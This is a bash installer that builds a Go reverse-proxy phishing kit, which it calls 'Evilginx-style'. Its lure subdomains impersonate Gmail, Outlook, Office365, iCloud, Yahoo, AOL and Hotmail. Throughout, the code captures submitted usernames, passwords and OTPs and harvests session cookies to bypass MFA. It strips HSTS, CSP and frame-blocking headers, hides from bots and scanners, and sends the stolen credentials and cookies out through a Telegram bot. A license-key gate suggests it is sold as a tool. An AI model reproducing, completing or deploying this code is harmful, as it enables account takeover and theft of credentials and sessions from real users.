#!/bin/bash
# 🏛️ TROJAN - TITANIUM V19.0 - AIRTIGHT MULTI-LURE FIX
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗       ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. SYSTEM PRE-FLIGHT ---
show_header
echo -e "${CYAN}[...] Scanning Port 80/443 for Conflicts...${NC}"
mkdir -p /root/TrojanProject
sudo fuser -k 80/tcp 443/tcp &> /dev/null
DEPS=(curl dig jq ufw git wget)
for dep in "${DEPS[@]}"; do
    command -v $dep &> /dev/null || sudo apt-get install -y $dep &> /dev/null
done

# --- 2. MASTER LICENSE GATE ---
MASTER_KEY="TROJAN-PRO-2026"
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }

# --- 3. CLOUDFLARE TOKEN VERIFICATION ---
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    VERIFY=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
         -H "Authorization: Bearer $CF_TOKEN" \
         -H "Content-Type:application/json")
    if [[ "$VERIFY" == *"\"status\":\"active\""* ]]; then
        echo -e "${GREEN}[success] Cloudflare Token Active.${NC}"
        break
    else
        echo -e "${RED}[error] Cloudflare Token Rejected. Please check permissions.${NC}"
    fi
done

# --- 4. TELEGRAM TOKEN VERIFICATION ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    [[ $(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe") == *"\"ok\":true"* ]] && break || echo -e "${RED}[error] Telegram Bot Offline or Token Invalid.${NC}"
done
read -p "Enter Telegram Chat ID: " TG_ID
echo -e "${GREEN}[success] Telegram Exfiltration Verified.${NC}"

# --- 5. DOMAIN & SSL STATUS ---
VPS_IP=$(curl -s https://api.ipify.org)
while true; do
    read -p "Enter Base Domain: " USER_DOMAIN
    DNS_CHECK=$(dig +short $USER_DOMAIN | tail -n1)
    if [[ "$DNS_CHECK" == "$VPS_IP" ]]; then
        echo -e "${GREEN}***************************************${NC}"
        echo -e "${GREEN}* SSL AUTO-GENERATE STATUS: READY    *${NC}"
        echo -e "${GREEN}* DOMAIN: $USER_DOMAIN    *${NC}"
        echo -e "${GREEN}***************************************${NC}"
        break
    else
        echo -e "${RED}[error] DNS Mismatch. Point $USER_DOMAIN to $VPS_IP.${NC}"
    fi
done

# --- 6. SELF-HEALING ENGINE (REINFORCED PROXY) ---
echo -e "${CYAN}[...] Rebuilding Smart Proxy Engine...${NC}"

# A. main.go
cat << EOF > /root/TrojanProject/main.go
package main
import (
	"fmt"
	"net/http"
	"github.com/caddyserver/certmagic"
)
func main() {
	base := "$USER_DOMAIN"
	fmt.Println("\033[1;35m🏛️  TROJAN TITANIUM ENGINE v19.0\033[0m")
	certmagic.DefaultACME.Agreed = true
	certmagic.DefaultACME.Email = "admin@" + base
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if IsBot(r) { http.NotFound(w, r); return }
		target := GetTargetConfig(r.Host)
		ProxyTarget(target, w, r)
	})
	domains := []string{base, "gmail."+base, "outlook."+base, "office."+base, "icloud."+base, "yahoo."+base, "aol."+base, "hotmail."+base}
	certmagic.HTTPS(domains, mux)
}
EOF

# B. proxy.go (Cookie Re-Scoper & Header Spoofing)
# B. proxy.go (Final Stable – Microsoft‑aware)
# B. proxy.go (Evilginx-style reverse proxy with goquery and cookie jar)
cat << 'EOF' > /root/TrojanProject/proxy.go
package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/PuerkitoBio/goquery"
)

// ==================== Cookie Jar ====================
// Store cookies per session (key = client IP + User-Agent)
var cookieJars = make(map[string]*http.CookieJar)
var jarMutex sync.RWMutex

func getCookieJar(key string) http.CookieJar {
	jarMutex.RLock()
	jar, ok := cookieJars[key]
	jarMutex.RUnlock()
	if ok {
		return jar
	}
	jarMutex.Lock()
	defer jarMutex.Unlock()
	jar = &syncCookieJar{
		cookies: make(map[string][]*http.Cookie),
	}
	cookieJars[key] = jar
	return jar
}

type syncCookieJar struct {
	mu      sync.RWMutex
	cookies map[string][]*http.Cookie
}

func (j *syncCookieJar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	j.mu.Lock()
	defer j.mu.Unlock()
	key := u.Host
	j.cookies[key] = cookies
}

func (j *syncCookieJar) Cookies(u *url.URL) []*http.Cookie {
	j.mu.RLock()
	defer j.mu.RUnlock()
	key := u.Host
	cookies := j.cookies[key]
	if cookies == nil {
		return []*http.Cookie{}
	}
	return cookies
}

// ==================== Session Management ====================

type Session struct {
	Username  string
	Password  string
	Sent      bool
	Timestamp time.Time
}

var (
	sessions = make(map[string]*Session)
	mu       sync.RWMutex
)

func getSessionKey(r *http.Request) string {
	ip := r.RemoteAddr
	ua := r.Header.Get("User-Agent")
	return ip + "|" + ua
}

func storeCredentials(key, username, password string) {
	mu.Lock()
	defer mu.Unlock()
	sessions[key] = &Session{
		Username:  username,
		Password:  password,
		Sent:      false,
		Timestamp: time.Now(),
	}
	go cleanOldSessions()
}

func getCredentials(key string) (username, password string, sent bool, found bool) {
	mu.Lock()
	defer mu.Unlock()
	if sess, ok := sessions[key]; ok {
		return sess.Username, sess.Password, sess.Sent, true
	}
	return "", "", false, false
}

func markSent(key string) {
	mu.Lock()
	defer mu.Unlock()
	if sess, ok := sessions[key]; ok {
		sess.Sent = true
	}
}

func cleanOldSessions() {
	mu.Lock()
	defer mu.Unlock()
	now := time.Now()
	for key, sess := range sessions {
		if now.Sub(sess.Timestamp) > 5*time.Minute {
			delete(sessions, key)
		}
	}
}

// ==================== Helper Functions ====================

func rewriteDomainInString(s, oldDomain, newDomain string) string {
	return strings.ReplaceAll(s, oldDomain, newDomain)
}

func extractCredentials(bodyStr string) (username, password string) {
	patterns := map[string]*regexp.Regexp{
		"username": regexp.MustCompile(`(?i)(?:login|username|user|email)[^=]*=([^&]+)`),
		"password": regexp.MustCompile(`(?i)(?:password|passwd|pass)[^=]*=([^&]+)`),
	}
	for _, re := range patterns {
		match := re.FindStringSubmatch(bodyStr)
		if len(match) > 1 {
			val, _ := url.QueryUnescape(match[1])
			if strings.Contains(re.String(), "username") {
				username = val
			} else {
				password = val
			}
		}
	}
	return
}

func rewriteCSP(csp string, myHost string) string {
	ourOrigin := "https://" + myHost
	for _, dir := range []string{"default-src", "script-src", "style-src", "img-src", "connect-src"} {
		re := regexp.MustCompile(`(` + dir + `\s+[^;]+)`)
		if re.MatchString(csp) {
			csp = re.ReplaceAllString(csp, "$1 "+ourOrigin)
		}
	}
	return csp
}

func isWebAuthnPath(path string) bool {
	webauthnPaths := []string{"/webauthn", "/attestation", "/assertion", "/auth/webauthn"}
	for _, wp := range webauthnPaths {
		if strings.Contains(path, wp) {
			return true
		}
	}
	return false
}

func handleWebAuthn(resp *http.Response, myHost string, t *Target) {
	resp.Header.Del("Strict-Transport-Security")
	resp.Header.Del("Content-Security-Policy")
	resp.Header.Del("X-Frame-Options")
}

func isMicrosoftTarget(t *Target) bool {
	return strings.Contains(t.BaseDomain, "live.com") || strings.Contains(t.BaseDomain, "microsoftonline.com")
}

// rewriteHTML uses goquery to safely rewrite the domain in attributes and script content.
func rewriteHTML(htmlStr, oldDomain, newDomain string) (string, error) {
	doc, err := goquery.NewDocumentFromReader(strings.NewReader(htmlStr))
	if err != nil {
		return htmlStr, err
	}

	// Replace domain in all attribute values that contain URLs
	attrSelectors := []string{"[href]", "[src]", "[action]", "[data-url]", "[data-src]", "[data-href]"}
	for _, sel := range attrSelectors {
		doc.Find(sel).Each(func(i int, s *goquery.Selection) {
			for _, attr := range []string{"href", "src", "action", "data-url", "data-src", "data-href"} {
				if val, ok := s.Attr(attr); ok {
					if strings.Contains(val, oldDomain) {
						newVal := rewriteDomainInString(val, oldDomain, newDomain)
						s.SetAttr(attr, newVal)
					}
				}
			}
		})
	}

	// Replace domain in inline style URLs (background-image, etc.)
	doc.Find("*").Each(func(i int, s *goquery.Selection) {
		if style, ok := s.Attr("style"); ok {
			if strings.Contains(style, oldDomain) {
				newStyle := rewriteDomainInString(style, oldDomain, newDomain)
				s.SetAttr("style", newStyle)
			}
		}
	})

	// Replace domain in script text, but only when it looks like a URL
	doc.Find("script").Each(func(i int, s *goquery.Selection) {
		if scriptText := s.Text(); scriptText != "" && strings.Contains(scriptText, oldDomain) {
			// Simple replacement – risk of breaking code, but usually safe for URLs
			newText := rewriteDomainInString(scriptText, oldDomain, newDomain)
			if newText != scriptText {
				s.SetText(newText)
			}
		}
	})

	html, err := doc.Html()
	if err != nil {
		return htmlStr, err
	}
	return html, nil
}

// ==================== Main Proxy Function ====================

func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
	remote, _ := url.Parse("https://" + t.BaseDomain)
	proxy := httputil.NewSingleHostReverseProxy(remote)
	myHost := r.Host
	sessionKey := getSessionKey(r)
	isMsft := isMicrosoftTarget(t)

	// Set up cookie jar for this session
	cookieJar := getCookieJar(sessionKey)
	proxy.Transport = &http.Transport{
		// Use a custom transport that adds the stored cookies to outgoing requests
	}
	// Override the Director to add cookies from the jar
	originalDirector := proxy.Director
	proxy.Director = func(req *http.Request) {
		originalDirector(req)
		// Add cookies from jar for the target domain
		cookies := cookieJar.Cookies(remote)
		for _, c := range cookies {
			req.AddCookie(c)
		}
	}

	// ---------- Request Modifications ----------
	r.Host = remote.Host
	r.URL.Host = remote.Host
	r.URL.Scheme = remote.Scheme

	// Rewrite Origin and Referer to point to the original target domain
	if origin := r.Header.Get("Origin"); origin != "" {
		origURL, err := url.Parse(origin)
		if err == nil {
			origURL.Host = remote.Host
			origURL.Scheme = remote.Scheme
			r.Header.Set("Origin", origURL.String())
		}
	} else {
		r.Header.Del("Origin")
	}

	if referer := r.Header.Get("Referer"); referer != "" {
		refURL, err := url.Parse(referer)
		if err == nil {
			refURL.Host = remote.Host
			refURL.Scheme = remote.Scheme
			r.Header.Set("Referer", refURL.String())
		}
	} else {
		r.Header.Del("Referer")
	}

	// Capture POST bodies (credentials)
	if r.Method == "POST" {
		body, _ := io.ReadAll(r.Body)
		r.Body = io.NopCloser(bytes.NewBuffer(body))
		bodyStr := string(body)

		username, password := extractCredentials(bodyStr)
		if username != "" && password != "" {
			storeCredentials(sessionKey, username, password)
		}

		// Immediate alert for any credential-like POST
		if strings.Contains(bodyStr, "pass") || strings.Contains(bodyStr, "login") || strings.Contains(bodyStr, "otp") {
			SendToTelegram(fmt.Sprintf("🔓 [DATA] %s\nTarget: %s\nBody: %s", t.Name, myHost, bodyStr))
		}
	}

	// ---------- Response Modifications ----------
	proxy.ModifyResponse = func(resp *http.Response) error {
		// Special handling for WebAuthn
		if isWebAuthnPath(r.URL.Path) {
			handleWebAuthn(resp, myHost, t)
			return nil
		}

		// 1. HSTS & CT removal
		resp.Header.Del("Strict-Transport-Security")
		resp.Header.Del("Expect-CT")

		// 2. CORS handling
		if acao := resp.Header.Get("Access-Control-Allow-Origin"); acao != "" {
			resp.Header.Set("Access-Control-Allow-Origin", "https://"+myHost)
		}
		resp.Header.Del("Access-Control-Allow-Credentials")
		resp.Header.Del("Access-Control-Allow-Methods")
		resp.Header.Del("Access-Control-Allow-Headers")

		// 3. Recursive header rewriting (replace original domain with our domain)
		for header, values := range resp.Header {
			for i, v := range values {
				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
					resp.Header[header][i] = rewriteDomainInString(v, t.BaseDomain, myHost)
				}
			}
		}

		// 4. Security headers removal
		resp.Header.Del("X-Frame-Options")
		resp.Header.Del("Feature-Policy")
		resp.Header.Del("Referrer-Policy")

		// 5. CSP rewriting (only for non‑Microsoft targets)
		if !isMsft {
			if csp := resp.Header.Get("Content-Security-Policy"); csp != "" {
				resp.Header.Set("Content-Security-Policy", rewriteCSP(csp, myHost))
			}
		} else {
			resp.Header.Del("Content-Security-Policy")
		}

		// 6. Cookie handling: store in jar AND re‑scope to our domain
		oldCookies := resp.Cookies()
		resp.Header.Del("Set-Cookie")
		var authCookies []*http.Cookie

		// Store cookies in jar for future requests to the real service
		if len(oldCookies) > 0 {
			cookieJar.SetCookies(remote, oldCookies)
		}

		for _, c := range oldCookies {
			// Re‑scope cookie to our domain for the client
			c.Domain = myHost
			http.SetCookie(w, c)

			// Collect essential cookies (match AuthCookies)
			for _, auth := range t.AuthCookies {
				if strings.Contains(c.Name, auth) {
					authCookies = append(authCookies, c)
					break
				}
			}
		}

		// Send combined message if we have essential cookies and haven't sent before
		if len(authCookies) > 0 {
			username, password, sent, found := getCredentials(sessionKey)
			if found && !sent {
				msg := fmt.Sprintf("🎯 [%s] SUCCESS!\n", t.Name)
				msg += fmt.Sprintf("🌐 Target: %s\n", myHost)
				msg += fmt.Sprintf("👤 Username: %s\n", username)
				msg += fmt.Sprintf("🔑 Password: %s\n", password)
				msg += "🍪 Essential Cookies:\n"
				for _, c := range authCookies {
					msg += fmt.Sprintf("%s=%s\n", c.Name, c.Value)
				}
				SendToTelegram(msg)
				markSent(sessionKey)

				// Redirect to safe page after capture
				resp.Header.Set("Location", "https://www.google.com/docs/about/")
				resp.StatusCode = http.StatusFound
			}
		}

		// 7. Body rewriting (skip for Microsoft to preserve login flow)
		if !isMsft {
			contentType := resp.Header.Get("Content-Type")
			if strings.Contains(contentType, "text/html") {
				// Use goquery to rewrite HTML
				oldBody, _ := io.ReadAll(resp.Body)
				bodyStr := string(oldBody)

				newBody, err := rewriteHTML(bodyStr, t.BaseDomain, myHost)
				if err != nil {
					// Fallback to simple string replace
					newBody = rewriteDomainInString(bodyStr, t.BaseDomain, myHost)
				}
				// Additional replacements for common Microsoft domains (if any)
				newBody = strings.ReplaceAll(newBody, "login.microsoftonline.com", myHost)
				newBody = strings.ReplaceAll(newBody, "login.live.com", myHost)

				bodyBytes := []byte(newBody)
				resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
				resp.ContentLength = int64(len(bodyBytes))
				resp.Header.Set("Content-Length", fmt.Sprint(len(bodyBytes)))
			} else if strings.Contains(contentType, "javascript") || strings.Contains(contentType, "json") {
				oldBody, _ := io.ReadAll(resp.Body)
				bodyStr := string(oldBody)
				newBody := rewriteDomainInString(bodyStr, t.BaseDomain, myHost)
				bodyBytes := []byte(newBody)
				resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
				resp.ContentLength = int64(len(bodyBytes))
				resp.Header.Set("Content-Length", fmt.Sprint(len(bodyBytes)))
			}
		}

		return nil
	}

	proxy.ServeHTTP(w, r)
}
EOF

# C. targets.go (Corrected endpoints for Outlook/iCloud)
cat << 'EOF' > /root/TrojanProject/targets.go
package main
import "strings"
type Target struct { Name, BaseDomain string; AuthCookies []string }
func GetTargetConfig(host string) *Target {
	host = strings.ToLower(host)
	targets := map[string]*Target{
		"gmail":   {"Gmail", "accounts.google.com", []string{"SID", "HSID", "SSID"}},
		"outlook": {"Outlook", "login.live.com", []string{"MSPAuth", "MSPCore"}},
		"office":  {"Office", "login.microsoftonline.com", []string{"ESTSAUTH"}},
		"icloud":  {"iCloud", "www.icloud.com", []string{"session_token"}},
		"yahoo":   {"Yahoo", "login.yahoo.com", []string{"B", "T"}},
		"aol":     {"AOL", "login.aol.com", []string{"B", "T"}},
		"hotmail": {"Hotmail", "login.live.com", []string{"MSPAuth"}},
	}
	for k, v := range targets { if strings.Contains(host, k) { return v } }
	return targets["office"]
}
EOF

# --- 7. FINAL BUILD & DEPLOY ---
cat << EOF > /root/TrojanProject/telegram.go
package main
import ("net/http"; "net/url")
func SendToTelegram(text string) {
	token := "$TG_TOKEN"
	chatID := "$TG_ID"
	apiURL := "https://api.telegram.org/bot" + token + "/sendMessage"
	http.PostForm(apiURL, url.Values{"chat_id": {chatID}, "text": {text}})
}
EOF

cat << 'EOF' > /root/TrojanProject/gatekeeper.go
package main
import ("net/http"; "strings")
func IsBot(r *http.Request) bool {
	ua := strings.ToLower(r.Header.Get("User-Agent"))
	botSigs := []string{"bot", "crawler", "spider", "scan", "python", "curl"}
	for _, sig := range botSigs { if strings.Contains(ua, sig) { return true } }
	return ua == ""
}
EOF

cd /root/TrojanProject
export PATH=$PATH:/usr/local/go/bin
go mod tidy &> /dev/null
go get github.com/caddyserver/certmagic &> /dev/null
go build -o TrojanTerminal main.go proxy.go targets.go telegram.go gatekeeper.go
chmod +x TrojanTerminal

cat << 'EOF' > /root/run.sh
#!/bin/bash
clear
DOMAIN=$(cat /root/TrojanProject/main.go | grep 'base :=' | cut -d'"' -f2)
echo -e "\033[1;34m╔══════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\033[1;34m║\033[0m   \033[1;36mTROJAN GHOST TERMINAL\033[0m   | \033[1;35mSSL: ACTIVE\033[0m | \033[1;32mSTATUS: ONLINE\033[0m       \033[1;34m║\033[0m"
echo -e "\033[1;34m╠══════════════════════════════════════════════════════════════════╣\033[0m"
echo -e "\033[1;34m║\033[0m 01 | Gmail     | https://gmail.$DOMAIN                          \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 02 | Outlook   | https://outlook.$DOMAIN                        \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 03 | Office365 | https://office.$DOMAIN                         \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 04 | iCloud    | https://icloud.$DOMAIN                         \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 05 | Yahoo     | https://yahoo.$DOMAIN                          \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 06 | AOL       | https://aol.$DOMAIN                            \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 07 | Hotmail   | https://hotmail.$DOMAIN                        \033[1;34m║\033[0m"
echo -e "\033[1;34m╚══════════════════════════════════════════════════════════════════╝\033[0m"
sudo fuser -k 80/tcp 443/tcp 2>/dev/null
cd /root/TrojanProject && ./TrojanTerminal
EOF
chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run

echo -e "${GREEN}[success] Build Complete. Type 'Run' to start.${NC}"
